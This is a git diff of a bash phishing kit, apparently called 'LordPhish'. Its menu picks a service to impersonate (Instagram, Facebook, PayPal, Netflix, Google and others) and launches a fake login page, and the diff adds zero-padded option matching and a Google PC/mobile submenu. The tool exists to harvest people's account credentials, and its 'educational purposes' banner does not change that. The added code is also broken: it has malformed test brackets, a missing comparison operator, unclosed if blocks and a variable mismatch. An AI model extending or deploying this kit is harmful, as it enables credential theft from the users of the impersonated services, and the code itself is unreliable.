@@ -64,35 +64,35 @@ printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
 
-if [[ $option == 1 ]]; then
+if [[ $option == "1" || $option == "01"]]; then
 server="instagram"
 start
 
-elif [[ $option == 2 ]]; then
+elif [[ $option == "2" || $option == "02"]]; then
 server="facebook"
 start
-elif [[ $option == 3 ]]; then
+elif [[ $option == "3" || $option == "03" ]]; then
 server="snapchat"
 start
-elif [[ $option == 4 ]]; then
+elif [[ $option == "4" || $option == "04" ]]; then
 server="twitter"
 start
-elif [[ $option == 5 ]]; then
+elif [[ $option == "5" || $option == "05" ]]; then
 server="github"
 start
-elif [[ $option == 6 ]]; then
+elif [[ $option == "6" || $option == "06" ]]; then
 server="google"
-start
+list_g
 
-elif [[ $option == 7 ]]; then
+elif [[ $option == "7" || $option == "07" ]]; then
 server="spotify"
 start
 
-elif [[ $option == 8 ]]; then
+elif [[ $option == "8" || $option == "08" ]]; then
 server="netflix"
 start
 
-elif [[ $option == 9 ]]; then
+elif [[ $option == "9" || $option == "09" ]]; then
 server="paypal"
 start
 
@@ -298,6 +298,22 @@ printf "     \e[101m\e[1;77m:: Only use for educational purporses!!             
 printf "\n"
 printf "     \e[101m\e[1;77m:: Attacking targets without mutual consent is illegal!      ::\e[0m\n"
 printf "\n"
+}
+
+list_g() {
+    clear
+    banner
+    
+    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Google to pc\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google mobile\e[0m\n"
+    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' oofic
+if [[ $option == "1" || $option "01"]]; then
+server="Google_pc"
+start
+    
+if [[ $option == "2" || $option "02"]]; then
+list_gm
+    
 }
 
 createpage() {
